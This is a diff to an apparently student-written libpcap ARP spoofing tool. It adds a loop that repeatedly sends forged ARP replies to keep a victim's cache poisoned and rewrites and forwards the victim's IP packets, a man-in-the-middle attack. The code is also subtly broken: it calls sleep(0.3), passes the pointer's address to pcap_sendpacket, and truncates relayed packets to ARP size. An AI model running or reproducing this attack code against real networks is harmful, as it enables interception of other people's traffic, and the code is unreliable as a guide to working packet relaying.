@@ -182,17 +182,45 @@ int main(int argc, char* argv[]) {
 		}
 
 		// Relay
-		EthArpPacket relayPacket;
-		pcap_next_ex(handle, &header, &rpacket);
-		relayPacket = *(EthArpPacket*)rpacket;
+		EthArpPacket* relayPacket;
+		
+		while (true) {
+			pcap_next_ex(handle, &header, &rpacket);
+			relayPacket = (EthArpPacket*)rpacket;
 
-		if (relayPacket.arp_.sip_ == senderIp) {
-			res = sendArp(handle, targetMac, myMac, ArpHdr::Request, myMac, relayPacket.arp_.sip_, targetMac, relayPacket.arp_.tip_);
-			if (res != 0) {
-				fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
+			// infect check
+			if (relayPacket->arp_.op() == ArpHdr::Request) {
+				sleep(0.3);
+				res = sendArp(handle, senderMac, myMac, ArpHdr::Reply, myMac, targetIp, senderMac, senderIp);
+				if (res != 0) {
+					fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
+				}
 			}
-		}
 
+
+			if (relayPacket->eth_.smac_ == senderMac && relayPacket->eth_.type() == EthHdr::Ip4) {
+				printf("arp \n");
+				relayPacket->eth_.smac_ = myMac;
+				relayPacket->eth_.dmac_ = targetMac;
+
+				// if (relayPacket == (EthArpPacket*)rpacket)
+				// 	printf("1\n");
+				// else
+				// 	printf("2\n");
+
+
+				res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&relayPacket), sizeof(EthArpPacket));
+				if (res != 0) {
+					fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
+				}
+				else
+					printf("hello\n");
+			}
+
+
+
+
+		}
 	}
 
 	pcap_close(handle);
